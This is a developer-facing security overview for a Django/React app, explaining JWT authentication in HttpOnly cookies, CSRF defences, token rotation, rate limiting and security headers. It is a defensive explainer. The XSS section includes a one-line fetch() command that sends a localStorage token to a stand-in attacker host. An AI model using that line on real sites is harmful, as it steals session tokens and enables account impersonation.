# Bloomprint Security Overview

This document explains every significant security measure in the application — what the threat is, how we defend against it, and where in the code that defence lives. It is written to be readable without a security background.

---

## 1. How Authentication Works

### The problem authentication solves

When a user logs in, we need a way for the server to recognise them on every subsequent request. HTTP is stateless — the server has no memory between requests — so we need to attach proof of identity to each one.

We use **JSON Web Tokens (JWTs)**. A JWT is a cryptographically signed string that contains the user's ID and an expiry time. The server creates it on login and signs it with a secret key. On every future request, the client sends the token back, and the server verifies the signature to confirm it hasn't been tampered with.

---

## 2. HttpOnly Cookies (the big one)

### The threat: XSS (Cross-Site Scripting)

XSS is when an attacker manages to get malicious JavaScript running on your page. This can happen through:
- An unsanitised input field that renders user content as HTML
- A compromised third-party JavaScript library (npm package)
- A browser extension with overly broad permissions

If your JWT is stored in `localStorage`, any JavaScript running on the page can read it:
```js
fetch("https://attacker.com/steal?token=" + localStorage.getItem("accessToken"))
```
One line. The attacker now has your user's token and can impersonate them for up to 90 days (our refresh token lifetime).

### The defence: HttpOnly cookies

An **HttpOnly cookie** is set by the server with a special flag that tells the browser: "do not let JavaScript read this cookie." It still gets sent automatically with requests, but it is completely invisible to `document.cookie` and therefore invisible to any XSS payload.

The attacker's one-liner above returns `null` — there is nothing to steal.

### Where this lives

- **`users/views/token_views.py`** — The `_set_auth_cookies()` helper sets both the access and refresh tokens as HttpOnly cookies on login, register, and token refresh responses.
- **`users/authentication.py`** — The `CookieJWTAuthentication` class reads the access token from the cookie (not the `Authorization` header) on every authenticated request.
- **`partners/views/partner_registration_view.py`** and **`users/views/register_view.py`** — Registration endpoints also set cookies immediately so the user is logged in right away.

### Cookie flags in use

Each cookie is set with three flags beyond HttpOnly:

| Flag | What it does |
|---|---|
| `HttpOnly` | Blocks JavaScript from reading the cookie |
| `Secure` | Cookie is only sent over HTTPS (on in production, off locally) |
| `SameSite=Lax` | Browser won't send the cookie on cross-site requests (see CSRF section below) |

---

## 3. CSRF Protection (Cross-Site Request Forgery)

### The threat

CSRF is the flip side of using cookies. Because the browser sends cookies *automatically* with every request to your domain, an attacker on `evil.com` can craft a hidden form that submits to `bloomprint.com.au/api/users/delete/`. The user's browser will helpfully attach the auth cookie, and the server has no way to tell the request didn't come from your own frontend.

HttpOnly cookies solve XSS but introduce this new risk.

### The defence: CSRF tokens

A CSRF token is a second, random value that the server sets as a *readable* cookie (not HttpOnly — intentionally). Your frontend JavaScript reads this value and includes it as a custom header (`X-CSRFToken`) on every request that changes data (POST, PUT, PATCH, DELETE).

The server checks: "did this request include the CSRF token that I set in the cookie?" A request from `evil.com` cannot include this header because:
1. The attacker's page is on a different domain
2. The browser's same-origin policy prevents `evil.com` from reading cookies belonging to `bloomprint.com.au`

So the attacker can trigger the request but can't include the token, and the server rejects it.

### SameSite=Lax as a first layer

The `SameSite=Lax` flag on the auth cookie provides a first line of defence. It tells the browser not to send the cookie on cross-site form submissions or AJAX requests. This blocks most naive CSRF attacks before the token check even happens.

The CSRF token check is the second, belt-and-suspenders layer.

### Where this lives

- **`django.middleware.csrf.CsrfViewMiddleware`** in `bloomprint/settings.py` (MIDDLEWARE list) — Django's built-in CSRF middleware sets the `csrftoken` cookie on every response.
- **`users/authentication.py` — `_enforce_csrf()`** — Our custom auth class manually enforces the CSRF check on every authenticated request (the same thing Django's `SessionAuthentication` does internally). This is critical: without it, cookie-based auth has no CSRF protection at the framework level.
- **`frontend/src/utils/utils.ts` — `getCsrfToken()`** — Reads the `csrftoken` cookie value.
- **`frontend/src/api/apiClient.ts` — `authedFetch()`** — Automatically includes the `X-CSRFToken` header on every non-GET request.

---

## 4. Token Lifetimes and Rotation

### Access token vs refresh token

We use two separate tokens with different lifetimes:

| Token | Lifetime | Stored as | Purpose |
| Access token | 60 minutes | HttpOnly cookie | Sent with every API request to prove identity |
| Refresh token | 90 days | HttpOnly cookie | Used to get a new access token when the old one expires |

The short access token lifetime limits the damage window if something goes wrong — even in a worst-case scenario, the access token is only valid for an hour. The longer refresh token means users don't have to log in again every hour.

### Token rotation

**`ROTATE_REFRESH_TOKENS: True`** in `bloomprint/settings.py` means every time you use the refresh token to get a new access token, you also get a *new* refresh token and the old one is retired. This limits the window of exposure for a stolen refresh token — if a stolen token is used, the legitimate user's next refresh will fail, alerting them (via logout) that something is wrong.

### Where this lives

- **`bloomprint/settings.py`** — `SIMPLE_JWT` dict controls all token lifetimes and rotation settings.
- **`users/views/token_views.py` — `CookieTokenRefreshView`** — Handles the rotation: reads the old refresh cookie, validates it, issues new access and refresh cookies.

---

## 5. Logout

### Why logout needs a server endpoint now

With `localStorage`, logout was purely a frontend action: delete the stored tokens and you're done. With HttpOnly cookies, the frontend *cannot* delete the cookies — that flag prevents JavaScript from touching them.

Logout is now a proper server request. The server responds with `Set-Cookie` headers that overwrite the existing cookies with empty values and an expiry in the past, causing the browser to discard them.

### Where this lives

- **`users/views/token_views.py` — `LogoutView`** — Calls `response.delete_cookie()` on both the access and refresh token cookies.
- **`bloomprint/urls.py`** — Registered at `POST /api/token/logout/`.
- **`frontend/src/api/auth.ts` — `logoutUser()`** — Calls the logout endpoint.
- **`frontend/src/context/AuthContext.tsx` — `logout()`** — Calls `logoutUser()` before clearing local user state.

---

## 6. Password Security

### Hashing

Passwords are never stored in plain text. Django uses **PBKDF2** with a SHA-256 hash by default — an intentionally slow algorithm designed to make brute-force attacks impractical. Each password gets a unique random salt, so two users with the same password have completely different hashes stored.

### Validation rules

Set in `bloomprint/settings.py` under `AUTH_PASSWORD_VALIDATORS`:
- **UserAttributeSimilarityValidator** — rejects passwords that are too similar to the user's name or email
- **MinimumLengthValidator** — enforces a minimum character count
- **CommonPasswordValidator** — rejects passwords on a list of the most commonly used passwords (e.g. "password123")
- **NumericPasswordValidator** — rejects passwords that are entirely numbers

---

## 7. Rate Limiting

### The threat

Without rate limiting, an attacker can hammer your API — attempting millions of passwords, scraping data, or just taking the server down.

### The defence

**`DEFAULT_THROTTLE_RATES`** in `bloomprint/settings.py`:
- Anonymous users: 200 requests per day
- Authenticated users: 500 requests per day

Additionally, the password reset endpoint has its own specific rate limit: a minimum of 60 seconds between reset email requests per account (`users/views/password_reset_request_view.py`). This prevents an attacker from spamming a user's inbox.

---

## 8. User Enumeration Prevention

### The threat

If your login or password reset endpoint returns different responses for "this email doesn't exist" vs "wrong password", an attacker can use that to build a list of valid email addresses on your platform.

### The defence

The password reset endpoint (`users/views/password_reset_request_view.py`) always returns the same response regardless of whether the email exists, whether the account is active, or whether the rate limit was hit:

> "If an account with this email exists, a password reset link has been sent."

The attacker learns nothing.

---

## 9. Security Headers

Provided automatically by **`django.middleware.security.SecurityMiddleware`** (in `bloomprint/settings.py`):

| Header | What it does |
|---|---|
| `X-Content-Type-Options: nosniff` | Prevents the browser from guessing the content type of a response, blocking a class of injection attacks |
| `X-Frame-Options: DENY` | Prevents your pages from being embedded in iframes on other sites (blocks clickjacking) |
| `Strict-Transport-Security` | Once configured with `SECURE_HSTS_SECONDS`, tells browsers to only ever contact your site over HTTPS, even if someone types `http://` |

> **Note:** HSTS requires `SECURE_HSTS_SECONDS` to be set in `settings.py` before it activates. This should be configured before going to production.

---

## Quick Reference: Adding a New Endpoint

When you add a new API endpoint, you need to make two decisions:

**Backend — who can access it?**
```python
# Requires login — CookieJWTAuthentication and CSRF enforcement happen automatically
permission_classes = [IsAuthenticated]

# Public — no token or CSRF handling needed
permission_classes = [AllowAny]
```

**Frontend — which fetch function?**
```ts
// Protected endpoint: handles cookies, CSRF header, and token refresh automatically
const response = await authedFetch('/api/your-endpoint/', { method: 'POST', body: ... });

// Public endpoint: plain fetch is fine
const response = await fetch('/api/your-endpoint/', { method: 'POST', ... });
```

That is all that is required. The security infrastructure runs transparently beneath both of these.
